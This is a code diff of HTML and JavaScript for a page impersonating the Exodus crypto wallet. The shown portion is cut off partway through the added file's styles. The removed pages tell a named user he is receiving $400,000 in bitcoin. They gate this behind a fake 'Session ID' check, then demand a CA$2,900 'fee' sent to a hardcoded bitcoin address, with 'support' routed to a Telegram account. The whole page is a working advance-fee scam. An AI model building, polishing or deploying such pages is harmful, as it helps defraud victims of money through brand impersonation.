@@ -1,545 +1,586 @@
-<!-- index.html -->
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Exodus CA$</title>
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", "Helvetica Neue", sans-serif; }
-    html, body { width: 100%; height: 100%; }
-    body { background: linear-gradient(135deg, #0f172a 0%, #1d2437 100%); color: #e2e8f0; min-height: 100vh; overflow-x: hidden; }
-    a { text-decoration: none; }
-
-    /* ===== WELCOME SCREEN ===== */
-    .welcome-screen { position: fixed; inset: 0; background: linear-gradient(135deg, #0f172a 0%, #1d2437 100%); display: flex; align-items: center; justify-content: center; z-index: 4000; transition: opacity 1s ease; opacity: 1; }
-    .welcome-screen.fade-out { opacity: 0; pointer-events: none; }
-    .welcome-content { text-align: center; color: white; max-width: 680px; padding: 20px; }
-    .welcome-badge { width: 110px; height: 110px; border-radius: 20px; background: linear-gradient(135deg, #f7931a, #e08f0f); display: inline-flex; align-items: center; justify-content: center; font-size: 44px; color: #071022; font-weight: 800; box-shadow: 0 18px 50px rgba(0,0,0,0.6); margin-bottom: 18px; }
-    .welcome-title { font-size: 28px; font-weight: 800; letter-spacing: -0.5px; margin-bottom: 6px; }
-    .welcome-message { font-size: 15px; color: #cbd5e0; margin-bottom: 10px; }
-    .welcome-loader { display: flex; justify-content: center; gap: 10px; margin-top: 8px; }
-    .loader-dot { width: 12px; height: 12px; border-radius: 50%; background: #f7931a; animation: bounceSmooth 1.4s infinite; }
-    .loader-dot:nth-child(2) { animation-delay: 0.12s; } .loader-dot:nth-child(3) { animation-delay: 0.24s; }
-    @keyframes bounceSmooth { 0%, 80%, 100% { transform: scale(0.8); opacity: 0.5; } 40% { transform: scale(1); opacity: 1; } }
-
-    /* ===== NAVBAR ===== */
-    .navbar { height: 72px; display:flex; align-items:center; justify-content:space-between; padding: 0 20px; background: rgba(15,23,42,0.8); backdrop-filter: blur(10px); border-bottom: 1px solid rgba(255,255,255,0.06); position: sticky; top:0; z-index: 1000; }
-    .navbar-left { display:flex; align-items:center; gap:14px; }
-    .canada-flag { width:26px; height:16px; display:flex; align-items:center; justify-content:center; font-size:12px; border-radius:2px; background: linear-gradient(90deg, #ff0000 0%, #ff0000 33%, white 33%, white 66%, #ff0000 66%, #ff0000 100%); }
-    .navbar-brand { font-size:20px; font-weight:800; color:#f7931a; display:flex; gap:8px; align-items:center; }
-    .user-profile { display:flex; align-items:center; gap:12px; }
-    .user-avatar { width:44px; height:44px; border-radius:10px; background: linear-gradient(135deg,#f7931a,#e08f0f); display:flex; align-items:center; justify-content:center; color:#071022; font-weight:800; }
-    .user-name { font-size:14px; font-weight:700; color:#e2e8f0; }
-    .user-status { font-size:12px; color:#94a3b8; }
-
-    /* ===== CONTAINER ===== */
-    .container { max-width:1180px; margin: 28px auto; padding: 24px; }
-    .page-header { text-align:left; margin-bottom:18px; }
-    .page-title { font-size:28px; font-weight:800; color:#f8fafc; margin-bottom:6px; }
-    .page-subtitle { color:#94a3b8; font-size:14px; }
-
-    /* ===== LAYOUT GRID ===== */
-    .grid { display:grid; grid-template-columns: 1fr 380px; gap:20px; align-items:start; }
-    @media (max-width: 980px) { .grid { grid-template-columns: 1fr; } }
-
-    /* ===== TRANSACTION CARD ===== */
-    .transaction-card { background: linear-gradient(180deg, rgba(10,14,22,0.6), rgba(12,16,22,0.45)); padding: 26px; border-radius: 14px; border:1px solid rgba(255,255,255,0.03); box-shadow: 0 24px 60px rgba(2,6,23,0.6); }
-    .transaction-label { color:#94a3b8; text-transform:uppercase; font-size:12px; font-weight:800; margin-bottom:8px; }
-    .transaction-type { display:flex; align-items:center; gap:10px; font-weight:700; color:#cbd5e0; margin-bottom:12px; }
-    .transaction-amount { font-size:40px; font-weight:900; color:#fff; }
-    .transaction-currency { color:#f7931a; font-weight:800; font-size:18px; margin-left:8px; }
-    .transaction-divider { height:1px; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.02), transparent); margin: 14px 0; }
-    .btc-value { color:#f7931a; font-weight:700; margin-bottom:6px; }
-
-    /* ===== INFO BOXES ===== */
-    .info-grid { display:grid; grid-template-columns: repeat(2,1fr); gap:12px; margin-top:12px; }
-    .info-box { padding:12px; border-radius:10px; background: rgba(255,255,255,0.02); border:1px solid rgba(255,255,255,0.02); }
-    .info-label { color:#94a3b8; font-size:12px; font-weight:800; text-transform:uppercase; margin-bottom:6px; }
-    .info-value { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Courier New", monospace; font-weight:800; color:#e2e8f0; }
-
-    /* ===== WALLET PANEL (RIGHT) ===== */
-    .wallet-panel { padding:16px; border-radius:12px; background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01)); border:1px solid rgba(255,255,255,0.03); box-shadow: 0 18px 40px rgba(2,6,23,0.55); position:relative; }
-    .wallet-title { font-weight:800; color:#e2e8f0; margin-bottom:8px; }
-    .wallet-sub { color:#94a3b8; font-size:12px; margin-bottom:10px; }
-    .wallet-address { background: rgba(30,41,59,0.6); padding:12px; border-radius:10px; font-family:ui-monospace,monospace; color:#e2e8f0; word-break:break-all; border:1px solid rgba(255,255,255,0.03); }
-    .wallet-actions { display:flex; gap:8px; margin-top:12px; }
-
-    .btn { padding:10px 12px; border-radius:10px; border:none; cursor:pointer; font-weight:800; }
-    .btn.primary { background: linear-gradient(135deg,#f7931a,#e08f0f); color:#071022; }
-    .btn.ghost { background: transparent; border:1px solid rgba(255,255,255,0.04); color:#f7931a; }
-
-    /* ===== MODAL ===== */
-    .modal-overlay { position: fixed; inset:0; display:none; align-items:center; justify-content:center; background: rgba(0,0,0,0.5); z-index: 4000; }
-    .modal-overlay.show { display:flex; }
-    .modal { width: min(640px, 96%); background: linear-gradient(180deg, rgba(15,23,42,0.96), rgba(10,14,22,0.96)); padding:20px; border-radius:12px; border:1px solid rgba(255,255,255,0.04); box-shadow:0 30px 80px rgba(0,0,0,0.6); }
-    .modal h3 { font-size:20px; margin-bottom:8px; }
-    .modal p { color:#94a3b8; font-size:14px; margin-bottom:12px; }
-    .form-row { display:flex; gap:8px; align-items:center; }
-    .form-row input { flex:1; padding:10px 12px; border-radius:10px; border:1px solid rgba(255,255,255,0.04); background:transparent; color:#e2e8f0; }
-    .error { margin-top:10px; background: rgba(255,77,79,0.08); border:1px solid rgba(255,77,79,0.16); color:#ffd7d9; padding:10px; border-radius:8px; display:none; }
-
-    /* ===== NOTIFICATION ===== */
-    .notification-dropdown { position: fixed; top: 78px; right: 20px; width: min(420px, calc(100vw - 28px)); background: rgba(15,23,42,0.98); border:1px solid rgba(255,255,255,0.04); border-radius:12px; padding:14px; z-index:3000; box-shadow:0 30px 80px rgba(0,0,0,0.6); pointer-events:auto; }
-    .notification-header { display:flex; gap:10px; align-items:center; margin-bottom:8px; }
-    .notification-title { color:#f7931a; font-weight:900; }
-    .notification-message { color:#cbd5e0; font-size:13px; margin-bottom:8px; }
-    .notification-fee { background: rgba(247,147,26,0.06); padding:10px; border-radius:8px; font-weight:800; margin-bottom:8px; display:flex; justify-content:space-between; align-items:center; }
-    .notification-address { background: rgba(255,255,255,0.02); padding:10px; border-radius:8px; font-family: ui-monospace,monospace; font-size:13px; color:#dbeafe; word-break:break-all; margin-bottom:8px; }
-    .notification-actions { display:flex; gap:8px; margin-top:6px; }
-    .notification-gif { position:absolute; right:10px; bottom:10px; width:64px; height:64px; border-radius:50%; overflow:hidden; box-shadow:0 10px 30px rgba(0,0,0,0.5); }
-
-    /* ===== PENDING PAGE ===== */
-    .pending-page { position: fixed; inset: 0; background: linear-gradient(135deg, #0f172a 0%, #1d2437 100%); display: none; align-items:center; justify-content:center; z-index:5000; padding:24px; color:#e2e8f0; }
-    .pending-page.show { display:flex; }
-    .pending-card { width: min(780px, 96%); background: linear-gradient(180deg, rgba(15,23,42,0.9), rgba(10,14,22,0.9)); padding:26px; border-radius:12px; border:1px solid rgba(255,255,255,0.04); box-shadow:0 30px 80px rgba(0,0,0,0.6); text-align:center; }
-    .pending-spinner { width:96px; height:96px; border-radius:50%; background: linear-gradient(135deg,#f7931a,#e08f0f); display:flex; align-items:center; justify-content:center; font-size:36px; color:#071022; margin:0 auto 12px; box-shadow:0 20px 60px rgba(0,0,0,0.4); }
-    .pending-title { font-size:22px; font-weight:900; margin-bottom:6px; }
-    .pending-status { color:#a855f7; font-weight:800; margin-bottom:8px; }
-    .pending-amount { color:#f7931a; font-weight:900; font-size:28px; margin-bottom:6px; }
-    .pending-details { margin-top:12px; color:#cbd5e0; font-size:13px; }
-
-    @media (max-width:640px) {
-      .notification-dropdown { left: 12px; right: 12px; top: 72px; width: auto; }
-      .grid { grid-template-columns: 1fr; }
-      .wallet-panel { order: -1; }
-    }
-  </style>
-</head>
-<body>
-  <!-- Welcome screen -->
-  <div class="welcome-screen" id="welcomeScreen" aria-hidden="false">
-    <div class="welcome-content" role="status" aria-live="polite">
-      <div class="welcome-badge">₿</div>
-      <div class="welcome-title">Welcome back, Stan Ottembrajt</div>
-      <div class="welcome-message">Professional settlement flow — verify with a Session ID to protect funds and ensure accurate reconciliation.</div>
-      <div class="welcome-loader" aria-hidden="true">
-        <div class="loader-dot"></div>
-        <div class="loader-dot"></div>
-        <div class="loader-dot"></div>
-      </div>
-    </div>
-  </div>
-
-  <!-- Navbar -->
-  <nav class="navbar" role="navigation" aria-label="Main navigation">
-    <div class="navbar-left">
-      <div class="canada-flag">🍁</div>
-      <div class="navbar-brand">₿ Exodus</div>
-    </div>
-    <div class="user-profile" aria-hidden="false">
-      <div class="user-avatar">SO</div>
-      <div>
-        <div class="user-name">Stan Ottembrajt</div>
-        <div class="user-status">Bitcoin</div>
-      </div>
-    </div>
-  </nav>
-
-  <div class="container">
-    <div class="page-header">
-      <div class="page-title">Transaction Confirmation</div>
-      <div class="page-subtitle">Review transaction details and complete the Session ID verification to proceed.</div>
-    </div>
-
-    <div class="grid" role="region" aria-labelledby="transaction-overview">
-      <div>
-        <div class="transaction-card" id="transaction-overview">
-          <div class="transaction-label">Dear Valued User — You are receiving</div>
-          <div class="transaction-type"><span>₿</span><span style="font-weight:800">Bitcoin</span></div>
-
-          <div class="transaction-amount-row" style="display:flex;align-items:center;gap:12px;">
-            <div class="transaction-amount" id="receiveAmountUSD">$400,000</div>
-            <div class="transaction-currency">USD</div>
-          </div>
-
-          <div class="transaction-divider"></div>
-
-          <div class="btc-value" id="receiveBtc">≈ 4.82 BTC</div>
-
-          <div class="info-grid">
-            <div class="info-box">
-              <div class="info-label">From Account</div>
-              <div class="info-value">Primary Wallet</div>
-            </div>
-            <div class="info-box">
-              <div class="info-label">Network</div>
-              <div class="info-value">Bitcoin Mainnet</div>
-            </div>
-          </div>
-
-          <div style="margin-top:14px;">
-            <button class="btn primary" id="openModalBtn" aria-haspopup="dialog">Confirm & Review Recipient</button>
-            <button class="btn ghost" id="explainBtn" style="margin-left:8px;">Why Session ID?</button>
-          </div>
-        </div>
-      </div>
-
-      <aside class="wallet-panel" aria-labelledby="fee-panel">
-        <div id="fee-panel">
-          <div class="wallet-title">Fee Payment / Authorization</div>
-          <div class="wallet-sub">Fee wallet (kept masked until verification)</div>
-          <div class="wallet-address" id="maskedFeeWallet" style="margin-top:10px;">bc1qjx8q…jrf</div>
-
-          <div style="margin-top:12px; font-size:13px; color:#94a3b8;">
-            Fee (service & settlement)
-          </div>
-          <div style="font-weight:900; font-size:20px; color:#f8fafc; margin-top:6px;">
-            CA$ <span id="feeAmount">—</span>
-          </div>
-
-          <div class="wallet-actions" style="margin-top:12px;">
-            <button class="btn ghost" id="copyMaskedBtn">Copy (masked)</button>
-            <button class="btn primary" id="revealBtn">Reveal after verification</button>
-          </div>
-
-          <div style="margin-top:12px; color:#94a3b8; font-size:13px;">
-            Support: <a href="https://t.me/AcesstBridge_go1" target="_blank" rel="noopener noreferrer" style="color:#f7931a;">Telegram</a> • <a href="mailto:support@exodus.example" style="color:#94a3b8;">support@exodus.example</a>
-          </div>
-        </div>
-      </aside>
-    </div>
-  </div>
-
-  <!-- notification (stays until user interacts) -->
-  <div class="notification-dropdown" id="notification" role="dialog" aria-live="polite" aria-label="Fee notification" style="display:none;">
-    <div class="notification-header">
-      <div style="width:44px;height:44;border-radius:10px;background:linear-gradient(135deg,#f7931a,#e08f0f);display:flex;align-items:center;justify-content:center;font-weight:800;">🔑</div>
-      <div>
-        <div class="notification-title">Session ID Required</div>
-        <div style="color:#cbd5e0;font-size:13px;">To finalize the transfer we need a single-use Session ID. This verifies your intent, prevents unauthorized payouts, and allows us to reconcile fee and recipient accurately.</div>
-      </div>
-    </div>
-
-    <div class="notification-message">
-      Please enter the Session ID you received via your registered device or email. The requirement is reasonable: it prevents accidental or fraudulent payouts and enables manual reconciliation before settlement.
-    </div>
-
-    <div style="margin-top:10px;" class="notification-fee">
-      <div>Required fee</div>
-      <div>CA$ <strong id="notifFee">2,900</strong></div>
-    </div>
-
-    <div class="notification-address" id="notifFeeAddress">
-      <strong style="color:#f7931a;">Fee Address:</strong><br>
-      bc1qjx8qvmt83uzpulefqvtsjfrrskxycjfggvqjrf
-    </div>
-
-    <div class="notification-actions">
-      <button class="btn primary" id="proceedNextBtn">Proceed to Next Page</button>
-      <button class="btn ghost" id="contactSupportBtn">Contact Support</button>
-    </div>
-
-    <div class="notification-gif" aria-hidden="true">
-      <img src="https://media.giphy.com/media/13HgwGsXF0aiGY/giphy.gif" alt="spinning bitcoin" style="width:100%;height:100%;object-fit:cover;" />
-    </div>
-  </div>
-
-  <!-- modal: Session ID + confirm recipient -->
-  <div class="modal-overlay" id="verifyModal" aria-modal="true" role="dialog" aria-hidden="true">
-    <div class="modal" role="document">
-      <h3>Confirm Recipient & Session ID</h3>
-      <p>Verify recipient details and enter the single-use Session ID to authorize this transaction. This prevents accidental or fraudulent payouts and ensures proper reconciliation.</p>
-
-      <div style="margin-top:12px; border-radius:8px; padding:12px; background: rgba(255,255,255,0.02); border:1px solid rgba(255,255,255,0.02);">
-        <div style="font-weight:800; margin-bottom:6px;">Recipient</div>
-        <div style="font-family:ui-monospace,monospace; margin-bottom:6px;">Stan Ottembrajt</div>
-        <div style="font-weight:800; margin-bottom:6px;">Receiving Address</div>
-        <div style="font-family:ui-monospace,monospace; word-break:break-all;">bc1q9nh4xgf85vx9uaplpa07drxv598wth0l63d4v3</div>
-        <div style="margin-top:8px; color:#94a3b8;">Amount: $400,000 (≈ 4.82 BTC)</div>
-      </div>
-
-      <div class="form-row" style="margin-top:12px;">
-        <input id="sessionIdInput" type="text" placeholder="Session ID (e.g. SESS-12345)" aria-label="Session ID" />
-        <button class="btn primary" id="verifyBtn">Verify</button>
-      </div>
-
-      <div class="error" id="verifyError" role="alert">Invalid Session ID. Please enter a valid Session ID (at least 6 characters) or contact support.</div>
-
-      <div style="display:flex; gap:8px; margin-top:12px;">
-        <button class="btn ghost" id="closeVerifyBtn">Cancel</button>
-        <button class="btn ghost" id="helpBtn">Need Help?</button>
-      </div>
-    </div>
-  </div>
-
-  <!-- pending overlay shown when user chooses to actually proceed from notification -->
-  <div class="pending-page" id="pendingPage" role="status" aria-live="polite" aria-hidden="true">
-    <div class="pending-card">
-      <div class="pending-spinner">⏳</div>
-      <div class="pending-title">Processing Transaction</div>
-      <div class="pending-status">Pending Credit</div>
-      <div class="pending-amount">$400,000</div>
-      <div class="pending-btc">4.82 BTC to Stan Ottembrajt</div>
-      <div class="pending-details" id="pendingDetails">
-        <div>Session ID: <span id="pendingSession">—</span></div>
-        <div>Network: Bitcoin Mainnet</div>
-        <div style="margin-top:10px; font-size:13px; opacity:0.9;">Receiving Address: <span id="pendingAddress">bc1q9nh4xgf85vx9uaplpa07drxv598wth0l63d4v3</span></div>
-      </div>
-    </div>
-  </div>
-
-  <script>
-    // Constants (as requested)
-    const FEE = 2900; // CA$
-    const FEE_WALLET = 'bc1qjx8qvmt83uzpulefqvtsjfrrskxycjfggvqjrf'; // keep same
-    const RECEIVER_NAME = 'Stan Ottembrajt';
-    const RECEIVER_ADDR = 'bc1q9nh4xgf85vx9uaplpa07drxv598wth0l63d4v3';
-    const RECEIVE_USD = '$400,000';
-    const RECEIVE_BTC = '4.82 BTC';
-
-    // Elements
-    const welcome = document.getElementById('welcomeScreen');
-    const feeAmountEl = document.getElementById('feeAmount');
-    const notifFeeEl = document.getElementById('notifFee');
-    const notifFeeAddr = document.getElementById('notifFeeAddress');
-    const maskedFeeWalletEl = document.getElementById('maskedFeeWallet');
-    const openModalBtn = document.getElementById('openModalBtn');
-    const verifyModal = document.getElementById('verifyModal');
-    const verifyBtn = document.getElementById('verifyBtn');
-    const closeVerifyBtn = document.getElementById('closeVerifyBtn');
-    const verifyError = document.getElementById('verifyError');
-    const sessionInput = document.getElementById('sessionIdInput');
-    const proceedNextBtn = document.getElementById('proceedNextBtn');
-    const contactSupportBtn = document.getElementById('contactSupportBtn');
-    const notificationEl = document.getElementById('notification');
-    const pendingPage = document.getElementById('pendingPage');
-    const pendingSessionEl = document.getElementById('pendingSession');
-
-    // helper: mask wallet
-    function mask(addr) {
-      if (!addr) return '';
-      const start = addr.slice(0, 8);
-      const end = addr.slice(-4);
-      return `${start}…${end}`;
-    }
-
-    // Animate fee reveal smoothly (not immediate)
-    function animateTo(target, el, duration = 2000) {
-      const start = 0;
-      const startTime = performance.now();
-      function step(now) {
-        const t = Math.min((now - startTime) / duration, 1);
-        const eased = (--t) * t * t + 1; // easeOutCubic
-        const value = Math.round(start + (target - start) * eased);
-        el.textContent = value.toLocaleString();
-        if (eased < 1) requestAnimationFrame(step);
-      }
-      requestAnimationFrame(step);
-    }
-
-    // Init UI state
-    document.getElementById('receiveAmountUSD').textContent = RECEIVE_USD;
-    document.getElementById('receiveBtc').textContent = `≈ ${RECEIVE_BTC}`;
-    document.querySelector('.wallet-address').textContent = RECEIVER_ADDR;
-
-    // set masked fee wallet and notif address
-    maskedFeeWalletEl.textContent = mask(FEE_WALLET);
-    notifFeeAddr.innerHTML = '<strong style="color: #f7931a;">Fee Address:</strong><br>' + FEE_WALLET;
-
-    // animate fee after brief delay
-    setTimeout(() => {
-      animateTo(FEE, feeAmountEl, 2200);
-      // set notification fee number immediately to the constant (it can remain visible)
-      notifFeeEl.textContent = FEE.toLocaleString();
-    }, 900);
-
-    // welcome: keep slightly longer for professional feel
-    window.addEventListener('load', () => {
-      setTimeout(() => {
-        welcome.classList.add('fade-out');
-        setTimeout(() => { try { welcome.remove(); } catch(e){} }, 1000);
-      }, 2000);
-    });
-
-    // reveal modal for verification
-    openModalBtn.addEventListener('click', () => {
-      verifyModal.classList.add('show');
-      verifyModal.setAttribute('aria-hidden', 'false');
-      sessionInput.focus();
-      verifyError.style.display = 'none';
-    });
-
-    closeVerifyBtn.addEventListener('click', () => {
-      verifyModal.classList.remove('show');
-      verifyModal.setAttribute('aria-hidden', 'true');
-      sessionInput.value = '';
-      verifyError.style.display = 'none';
-    });
-
-    // explain button
-    document.getElementById('explainBtn').addEventListener('click', () => {
-      alert('Session ID is a short, single-use code sent to your registered device or email that confirms you initiated this transfer. It prevents unauthorized payouts and lets our operations team reconcile the fee and recipient before settlement.');
-    });
-
-    // copy masked
-    document.getElementById('copyMaskedBtn').addEventListener('click', () => {
-      navigator.clipboard.writeText(mask(FEE_WALLET)).then(() => {
-        alert('Masked fee wallet copied to clipboard.');
-      }).catch(() => {
-        alert('Copy failed. You can reveal the full address after verification.');
-      });
-    });
-
-    // reveal button opens verification modal (wallet remains protected until verification)
-    document.getElementById('revealBtn').addEventListener('click', () => {
-      verifyModal.classList.add('show');
-      verifyModal.setAttribute('aria-hidden', 'false');
-      sessionInput.focus();
-      verifyError.style.display = 'none';
-    });
-
-    // verification: simple client-side rule for demo (>=6 chars). On success: show notification (stays) with Proceed button.
-    verifyBtn.addEventListener('click', () => {
-      const val = (sessionInput.value || '').trim();
-      if (val.length < 6) {
-        verifyError.style.display = 'block';
-        return;
-      }
-
-      // success: reveal masked field to full fee wallet in right panel and notification will appear.
-      maskedFeeWalletEl.textContent = FEE_WALLET;
-      // show notification and keep it visible until user chooses to proceed or close
-      notificationEl.style.display = 'block';
-
-      // populate pending session id so if they later proceed we can show it
-      pendingSessionEl.textContent = val;
-
-      // keep modal open minimal time so user sees that verification succeeded then close
-      setTimeout(() => {
-        verifyModal.classList.remove('show');
-        verifyModal.setAttribute('aria-hidden', 'true');
-        sessionInput.value = '';
-        verifyError.style.display = 'none';
-      }, 600);
-    });
-
-    // contact support from notification
-    contactSupportBtn.addEventListener('click', () => {
-      window.open('https://t.me/AcesstBridge_go1', '_blank', 'noopener');
-    });
-
-    // proceed to next page: show pending overlay, keep notification visible (not auto-hide), then go to next.html
-    proceedNextBtn.addEventListener('click', () => {
-      // require that the fee wallet was revealed (as a simple check that verification happened)
-      const currentWalletText = maskedFeeWalletEl.textContent || '';
-      if (!currentWalletText || currentWalletText.indexOf('…') !== -1) {
-        alert('Please verify with a Session ID before proceeding. The wallet is kept masked until verification for your safety.');
-        return;
-      }
-
-      // show pending overlay
-      pendingPage.classList.add('show');
-      pendingPage.setAttribute('aria-hidden', 'false');
-
-      // persist the state for next page
-      sessionStorage.setItem('txn_fee', FEE);
-      sessionStorage.setItem('txn_fee_wallet', FEE_WALLET);
-      sessionStorage.setItem('txn_receiver_name', RECEIVER_NAME);
-      sessionStorage.setItem('txn_receiver_addr', RECEIVER_ADDR);
-      sessionStorage.setItem('txn_amount_usd', RECEIVE_USD);
-      sessionStorage.setItem('txn_amount_btc', RECEIVE_BTC);
-
-      // keep notification visible; after brief processing navigate to next page
-      setTimeout(() => {
-        window.location.href = './next.html';
-      }, 1800);
-    });
-
-    // keyboard accessibility: Enter in sessionInput triggers verify
-    sessionInput.addEventListener('keydown', (e) => {
-      if (e.key === 'Enter') verifyBtn.click();
-    });
-  </script>
-</body>
-</html>
-
-<!-- next.html -->
 <!doctype html>
 <html lang="en">
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Exodus — Next Step (Settlement)</title>
+  <title>Exodus · Transaction Confirmation</title>
+  <meta name="description" content="Exodus Trezor biometric setup & transaction confirmation UI (demo). Session ID locked." />
   <style>
-    :root{ --bg-1:#05060b; --bg-2:#0f1724; --muted:#93a0b8; --accent:#ffb86b; }
-    html,body{height:100%;margin:0;font-family:Inter,system-ui,Segoe UI,Roboto,Helvetica,Arial;background:linear-gradient(180deg,var(--bg-1),var(--bg-2));color:#eaf0ff}
-    .wrap{max-width:980px;margin:36px auto;padding:20px}
-    .card{background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(255,255,255,0.01));padding:24px;border-radius:14px;border:1px solid rgba(255,255,255,0.03);box-shadow:0 30px 80px rgba(0,0,0,0.6)}
-    h1{margin:0 0 8px;font-size:20px}
-    .muted{color:var(--muted)}
-    .grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:16px}
-    .row{padding:12px;border-radius:10px;background:linear-gradient(180deg,rgba(255,255,255,0.01),transparent);border:1px solid rgba(255,255,255,0.02)}
-    .label{color:var(--muted);font-weight:800;font-size:12px}
-    .value{font-weight:900;font-family:ui-monospace,monospace;margin-top:6px;word-break:break-word}
-    .note{margin-top:14px;color:#cbd5e0}
-    .actions{display:flex;gap:10px;margin-top:18px}
-    .btn{padding:10px 14px;border-radius:10px;border:none;cursor:pointer;font-weight:800}
-    .btn.primary{background:linear-gradient(135deg,#9b7bff,#ffb86b);color:#071022}
-    .btn.ghost{background:transparent;border:1px solid rgba(255,255,255,0.04);color:#fff}
-    @media (max-width:700px){.grid{grid-template-columns:1fr}}
+    /* ---------- Theme & Reset ---------- */
+    :root{
+      --bg-1:#061025; --bg-2:#0f172a; --panel:#0c1624;
+      --accent:#f7931a; --muted:#94a3b8; --glass: rgba(255,255,255,0.04);
+      --success:#22c55e; --danger:#ef4444; --radius:14px;
+      --max-width:1120px; --safe-gap:20px;
+      --font-sans:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial;
+    }
+    *{box-sizing:border-box;margin:0;padding:0;font-family:var(--font-sans);-webkit-font-smoothing:antialiased;}
+    html,body{height:100%;background:linear-gradient(135deg,var(--bg-1) 0%, var(--bg-2) 100%);color:#e6eef8;}
+    a{color:inherit;text-decoration:none;}
+    img{max-width:100%;height:auto;display:block;border-radius:8px;}
+
+    /* ---------- Layout ---------- */
+    .container{max-width:var(--max-width);margin:0 auto;padding:28px;}
+    .navbar{height:72px;display:flex;align-items:center;justify-content:space-between;padding:0 var(--safe-gap);background:rgba(6,10,20,0.55);backdrop-filter:blur(8px);border-bottom:1px solid rgba(255,255,255,0.03);position:sticky;top:0;z-index:60;}
+    .brand{display:flex;align-items:center;gap:14px;font-weight:800;color:var(--accent);font-size:20px;}
+    .logo{width:48px;height:48px;border-radius:12px;background:linear-gradient(135deg,#f9a34a,#f7931a);display:flex;align-items:center;justify-content:center;color:#071022;font-weight:900;font-size:20px;box-shadow:0 8px 20px rgba(247,147,26,0.12);}
+    .nav-user{display:flex;gap:12px;align-items:center;color:#dbe8ff;font-weight:700;}
+
+    /* ---------- Hero / Card ---------- */
+    .page-header{text-align:center;margin:36px 0 22px;}
+    .page-title{font-size:30px;font-weight:900;color:#f8fafc;letter-spacing:-0.4px;}
+    .page-sub{color:var(--muted);margin-top:6px;}
+
+    .card{background:linear-gradient(180deg, rgba(12,18,28,0.9), rgba(6,10,16,0.86));border-radius:20px;padding:26px;border:1px solid rgba(255,255,255,0.04);box-shadow:0 30px 70px rgba(2,6,20,0.6);overflow:hidden;}
+    .label{font-size:11px;text-transform:uppercase;color:var(--muted);letter-spacing:1px;font-weight:800;margin-bottom:8px;}
+    .type{display:flex;align-items:center;gap:10px;justify-content:center;font-weight:700;color:#dfe9f8;margin-bottom:12px;}
+    .amount-row{display:flex;align-items:baseline;justify-content:center;gap:12px;flex-wrap:wrap;margin-bottom:10px;}
+    .amount{font-size:52px;font-weight:900;color:#fbfbfc;letter-spacing:-1px;}
+    .currency{font-size:18px;color:var(--accent);font-weight:800;}
+    .sub{color:var(--muted);text-align:center;font-weight:700;margin-bottom:8px;}
+    .divider{height:1px;background:linear-gradient(90deg,transparent,var(--accent),transparent);margin:18px 0;border-radius:2px;}
+
+    /* Info grid */
+    .grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:16px;}
+    .info{background:rgba(255,255,255,0.02);padding:14px;border-radius:12px;border:1px solid rgba(255,255,255,0.03);}
+    .info .value{font-family: "Courier New", monospace;font-weight:800;color:#eaf2ff;}
+
+    .wallet-block{background:rgba(255,255,255,0.02);padding:14px;border-radius:12px;border:1px solid rgba(255,255,255,0.03);margin-top:14px;}
+    .wallet-address{font-family:"Courier New",monospace;padding:12px;border-radius:10px;border:1px solid rgba(255,255,255,0.03);background:rgba(255,255,255,0.01);word-break:break-word;color:#eaf2ff;}
+
+    /* Controls */
+    .controls{display:flex;gap:12px;justify-content:center;margin-top:18px;flex-wrap:wrap;}
+    .btn{min-height:48px;padding:12px 18px;border-radius:12px;border:none;cursor:pointer;font-weight:800;font-size:15px;display:inline-flex;align-items:center;gap:10px;justify-content:center;}
+    .btn-primary{background:linear-gradient(135deg,var(--accent),#e08900);color:#06101a;box-shadow:0 16px 40px rgba(247,147,26,0.12);min-width:220px;}
+    .btn-ghost{background:transparent;border:2px solid rgba(255,255,255,0.06);color:var(--accent);min-width:190px;}
+    .btn:disabled{opacity:0.55;cursor:not-allowed;transform:none;}
+
+    /* Overlays & modals */
+    .overlay{position:fixed;inset:0;background:rgba(2,6,23,0.6);backdrop-filter:blur(6px);display:flex;align-items:center;justify-content:center;padding:20px;opacity:0;pointer-events:none;transition:opacity .28s ease;}
+    .overlay.show{opacity:1;pointer-events:auto;z-index:120;}
+    .modal{width:min(920px,96%);background:linear-gradient(180deg, rgba(16,22,32,0.98), rgba(6,10,16,0.98));border-radius:16px;padding:20px;border:1px solid rgba(255,255,255,0.04);box-shadow:0 30px 90px rgba(3,6,16,0.75);max-height:90vh;overflow:auto;}
+    .modal-head{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:12px;}
+    .modal-title{font-weight:900;font-size:20px;color:#f8fafc;}
+    .modal-sub{color:var(--muted);font-size:13px;}
+
+    .modal-body{display:grid;grid-template-columns:1fr 360px;gap:16px;}
+    .modal-left{padding-right:6px;}
+    .modal-right{background:rgba(255,255,255,0.02);padding:14px;border-radius:12px;border:1px solid rgba(255,255,255,0.03);}
+
+    /* Provided image preview (preloaded) */
+    .device-preview{width:100%;height:180px;border-radius:12px;overflow:hidden;border:1px solid rgba(255,255,255,0.04);display:flex;align-items:center;justify-content:center;background:linear-gradient(180deg,#0b1220,#071026);}
+
+    .wallet-options{display:flex;flex-direction:column;gap:8px;margin-top:12px;}
+    .wallet-option{display:flex;align-items:center;gap:10px;padding:10px;border-radius:10px;border:1px solid rgba(255,255,255,0.03);background:rgba(255,255,255,0.01);cursor:pointer;}
+    .wallet-option input{accent-color:var(--accent);}
+
+    .certificate{margin-top:12px;background:rgba(247,147,26,0.04);padding:12px;border-radius:10px;border:1px solid rgba(247,147,26,0.08);color:#fff;}
+    .certificate p{margin-top:8px;color:#eaf2ff;font-size:14px;line-height:1.38;}
+
+    .small{font-size:13px;color:var(--muted);}
+
+    /* Connect animation */
+    .connect-stack{display:flex;flex-direction:column;align-items:center;gap:16px;padding:12px;}
